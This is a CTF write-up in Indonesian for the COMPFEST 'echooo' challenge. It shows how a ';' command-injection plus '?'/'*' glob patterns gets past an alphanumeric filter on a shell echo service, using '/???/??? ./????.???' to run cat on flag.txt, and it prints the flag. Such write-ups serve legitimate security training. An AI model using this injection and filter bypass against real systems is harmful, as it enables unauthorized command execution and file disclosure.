# [500 pts] echooo
### Category: Miscellaneous

**Deskripsi:**
> Program ini akan melakukan echo pada setiap input yang kamu berikan, kecuali karakter alphanumeric. Flag in flag.txt  
>    
> Author: Zanark    
>     
> nc challenges.ctf.compfest.id 20014  

### Solusi:

Sesuai deskripsi challenge, diberikan shell yang akan melakukan echo pada command yang dimasukkan. Karakter alphanumeric akan dihilangkan dari command yang ditulis, sehingga user hanya bisa menggunakan simbol tertentu.

Maka, ide yang dapat kita gunakan yaitu dengan menggunakan regex untuk memanggil command pada directory /bin/.

Karakter yang mungkin digunakan yaitu '?' dan '*', karena '?' dapat digunakan untuk mencocokkan satu karakter dan '\*' dapat digunakan untuk mencocokkan satu atau lebih karakter.

Sehingga kita dapat melihat isi /bin/ dengan command '/???/*'

```shell
Gimme your input: /???/*
Your input: /???/*
/bin/bash /bin/bunzip2 /bin/bzcat /bin/bzcmp /bin/bzdiff /bin/bzegrep /bin/bzexe /bin/bzfgrep /bin/bzgrep /bin/bzip2 /bin/bzip2recover /bin/bzless /bin/bzmore /bin/cat /bin/chgrp /bin/chmod /bin/chown /bin/cp /bin/dash
/bin/date /bin/dd /bin/df /bin/dir /bin/dmesg /bin/dnsdomainname /bin/domainname /bin/echo /bin/egrep /bin/false /bin/fgrep /bin/findmnt /bin/grep /bin/gunzip /bin/gzexe /bin/gzip /bin/hostname /bin/kill /bin/ln /bin/login
/bin/ls /bin/lsblk /bin/mkdir /bin/mknod /bin/mktemp /bin/more /bin/mount /bin/mountpoint /bin/mv /bin/nisdomainname /bin/pidof /bin/ps /bin/pwd /bin/rbash /bin/readlink /bin/rm /bin/rmdir /bin/run-parts /bin/sed /bin/sh /bin/sh.distrib /bin/sleep
/bin/stty /bin/su /bin/sync /bin/tar /bin/tempfile /bin/touch /bin/true /bin/umount /bin/uname /bin/uncompress /bin/vdir /bin/wdctl /bin/which /bin/ypdomainname /bin/zcat /bin/zcmp /bin/zdiff /bin/zegrep /bin/zfgrep /bin/zforce /bin/zgrep /bin/zless
/bin/zmore /bin/znew /dev/core /dev/fd /dev/full /dev/mqueue /dev/null /dev/ptmx /dev/pts /dev/random /dev/shm /dev/stderr /dev/stdin /dev/stdout /dev/tty /dev/urandom /dev/zero /etc/adduser.conf /etc/alternatives /etc/apt /etc/bash.bashrc /etc/bindresvport.blacklist
/etc/cloud /etc/cron.daily /etc/debconf.conf /etc/debian_version /etc/default /etc/deluser.conf /etc/dpkg /etc/environment /etc/fstab /etc/gai.conf /etc/group /etc/gshadow /etc/host.conf /etc/hostname /etc/hosts /etc/hosts.allow /etc/hosts.deny /etc/init.d /etc/inputrc
/etc/issue /etc/issue.net /etc/kernel /etc/ld.so.cache /etc/ld.so.conf /etc/ld.so.conf.d /etc/legal /etc/libaudit.conf /etc/login.defs /etc/logrotate.d /etc/lsb-release /etc/machine-id /etc/magic /etc/magic.mime /etc/mailcap /etc/mailcap.order /etc/mime.types /etc/mke2fs.conf
/etc/mtab /etc/networks /etc/nsswitch.conf /etc/opt /etc/os-release /etc/pam.conf /etc/pam.d /etc/passwd /etc/profile /etc/profile.d /etc/python3 /etc/python3.6 /etc/rc0.d /etc/rc1.d /etc/rc2.d /etc/rc3.d /etc/rc4.d /etc/rc5.d /etc/rc6.d /etc/rcS.d /etc/resolv.conf /etc/rmt /etc/securetty
/etc/security /etc/selinux /etc/shadow /etc/shells /etc/skel /etc/subgid /etc/subuid /etc/sysctl.conf /etc/sysctl.d /etc/systemd /etc/terminfo /etc/update-motd.d /lib/init /lib/lsb /lib/systemd /lib/terminfo /lib/udev /lib/x86_64-linux-gnu /run/lock /run/mount /run/systemd /run/utmp /sys/block
/sys/bus /sys/class /sys/dev /sys/devices /sys/firmware /sys/fs /sys/hypervisor /sys/kernel /sys/module /sys/power /usr/bin /usr/games /usr/include /usr/lib /usr/local /usr/sbin /usr/share /usr/src /var/backups /var/cache /var/lib /var/local /var/lock /var/log /var/mail /var/opt /var/run /var/spool /var/tmp
```

Kemudian jika kita lihat file pada directory saat ini dengan menggunakan command './*' : 
```shell
Gimme your input: ./*
Your input: ./*
./flag.txt ./prob.py
```

Disini langsung terlihat file flag.txt yang berisi flag. Salah satu cara yang mungkin dilakukan untuk membuka file adalah dengan command '/bin/cat ./flag.txt'.

Jika kita mencoba command '/???/???'
```shell
Gimme your input: /???/???
Your input: /???/???
/bin/cat /bin/dir /bin/pwd /bin/sed /bin/tar /dev/pts /dev/shm /dev/tty /etc/apt /etc/opt /etc/rmt /lib/lsb /sys/bus /sys/dev /usr/bin /usr/lib /usr/src /var/lib
/var/log /var/opt /var/run /var/tmp
```

Terlihat bahwa /bin/cat adalah file pertama yang ter-output, karena file pertama yang ter-output dapat dijadikan command maka /bin/cat dapat kita gunakan untuk membuka file flag.

Command yang bisa digunakan untuk melakukan hal itu adalah:
```shell
Gimme your input: /???/??? ./????.???
Your input: /???/??? ./????.???
/bin/cat /bin/dir /bin/pwd /bin/sed /bin/tar /dev/pts /dev/shm /dev/tty /etc/apt /etc/opt /etc/rmt /lib/lsb /sys/bus /sys/dev /usr/bin /usr/lib /usr/src /var/lib
/var/log /var/opt /var/run /var/tmp ./flag.txt
```

Dengan command tersebut, /bin/cat akan membaca seluruh file mulai dari /bin/dir, /bin/pwd, ... , ./flag.txt

Kita tinggal escape dari echo yang dilakukan shell dengan menggunakan karakter ';' diawal, sehingga command yang akan digunakan yaitu:
```shell
Gimme your input: ; /???/??? ./????.???
```

Memberikan command tersebut pada shell challenge akan setara dengan meng-execute command:
```shell
echo ; /???/??? ./????.???
```

Sehingga akan didapatkan flag pada akhir output /bin/cat.

**Note:** jika flag tidak muncul artinya output ter-truncate oleh netcat. Jika terjadi maka lakukan challenge melalui pwntools.

> Flag: **COMPFEST16{3ch0ing_4r0uNd_w1th_sYmb0ls_3bc526845e}**
